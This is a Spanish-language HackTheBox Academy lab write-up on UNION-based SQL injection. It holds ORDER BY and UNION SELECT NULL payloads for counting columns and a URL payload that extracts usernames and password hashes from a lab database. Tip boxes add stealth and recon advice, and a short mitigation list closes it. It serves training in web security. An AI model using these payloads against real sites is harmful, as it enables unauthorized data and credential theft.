---
title: "UNION Detección de Columnas"
platform: "HackTheBox"
os: "Windows"
difficulty: "Easy"
ip: "10.10.10.XXX"
slug: "union-deteccion-de-columnas"
author: "Z4k7"
date: "2026-03-26"
year: "2026"
status: "pwned"
tags:
  - "lab"
  - "htb"
  - "academy"
  - "sqli"
  - "union"
techniques:
  - "UNION injection"
  - "ORDER BY"
  - "detección de columnas"
  - "extracción de datos"
tools:
  - "browser"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Ejercicio del módulo SQL Injection Fundamentals de HTB Academy. Detección del número de columnas via ORDER BY y UNION NULL, identificación de columnas visibles, extracción de user() y hash de contraseña via UNION SELECT.  ---"
steps:

  - id: "recon_1"
    num: "01"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Validamos si contamos con acceso al laboratorio en la pagina web primero realizamos un reconocimiento.
      - kind: "image"
        src: "assets/images/SQLI/file-20260324125050725.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Consultamos donde se puede aplicar el SQLI
      - kind: "image"
        src: "assets/images/SQLI/file-20260324125130637.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Antes de intentar UNION confirma primero que hay SQLi con `'`. Si la app devuelve error o comportamiento anormal — hay inyección. Solo entonces pasas a detectar columnas."

  - id: "enum_1"
    num: "02"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Si aplicamos una consulta en este caso la letra A obtendremos resultados en la tabla entramos a validar si es posible romper la consulta para inyectar código arbitrario
      - kind: "image"
        src: "assets/images/SQLI/file-20260324125244364.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Tratamos de obtener el numero de columnas ORDER BY
      - kind: "code"
        lang: "SQL"
        code: |
          ' ORDER BY 1-- - OK
          ' ORDER BY 1,2-- - OK
          ' ORDER BY 1,2,3-- - OK
          ' ORDER BY 1,2,3,4-- - OK
          ' ORDER BY 1,2,3,4,5-- - KO
          etc.
      - kind: "image"
        src: "assets/images/SQLI/file-20260324130245070.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Tratamos de obtener el numero de columnas UNION SELECT
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT NULL-- -  ERROR
          ' UNION SELECT NULL,NULL-- - ERROR 
          ' UNION SELECT NULL,NULL,NULL,NULL-- - OK
          ' UNION SELECT NULL,NULL,NULL,NULL,NULL-- - ERROR
          etc.
      - kind: "image"
        src: "assets/images/SQLI/file-20260324130545123.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Prefiere ORDER BY sobre UNION NULL — es más silencioso y menos probable que rompa la app. El `-- -` es más robusto que `--` solo en MySQL."

  - id: "exploit_1"
    num: "03"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Validamos donde se puede aplicar información o donde se puede visualizar información
      - kind: "image"
        src: "assets/images/SQLI/file-20260324130909979.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Aplicamos la consulta que menciona en este caso `user()`.
      - kind: "image"
        src: "assets/images/SQLI/file-20260324131003488.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          ¿Cuál es el hash de la contraseña para 'newuser' almacenado en la tabla 'users' de la base de datos 'ilfreight'?
      - kind: "code"
        lang: "C"
        code: |
          http://154.57.164.75:32114/search.php?port_code=A%27%20UNION%20SELECT%20username,password,username,%27A%27%20FROM%20users%20--%20-
      - kind: "image"
        src: "assets/images/SQLI/file-20260324131555390.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Siempre prueba primero `user()`, `@@version` y `database()` — te dan el contexto completo del entorno en 3 queries antes de ir a `information_schema`."

lessons:
  - 'ORDER BY es el método más limpio para detectar número de columnas'
  - 'UNION NULL confirma el número antes de explotar'
  - 'Identificar columnas visibles en la respuesta es crítico antes de extraer datos'
mitigation:
  - 'Prepared statements — eliminan UNION injection completamente'
  - 'Nunca mostrar errores SQL en el frontend'
---
